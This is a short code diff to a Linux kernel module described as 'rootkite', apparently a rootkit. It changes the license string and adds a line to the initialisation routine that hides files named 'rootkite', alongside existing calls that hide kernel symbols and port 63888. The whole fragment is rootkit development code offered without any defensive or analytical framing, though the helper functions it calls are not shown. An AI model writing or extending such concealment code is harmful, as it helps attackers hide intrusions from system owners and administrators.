@@ -11,7 +11,7 @@
 #include "device_handler.h"
 
 
-MODULE_LICENSE("GPL");
+MODULE_LICENSE("GPL v2");
 MODULE_DESCRIPTION("rootkite");
 MODULE_AUTHOR("NondairyDig");
 MODULE_VERSION("1.0");
@@ -51,6 +51,7 @@ static int __init mod_init(void){
     }
     hide_ksyms();
     insert_node(&ports_to_hide, "63888");
+    insert_node(&files_to_hide, "rootkite");
     return 0;
 }
 
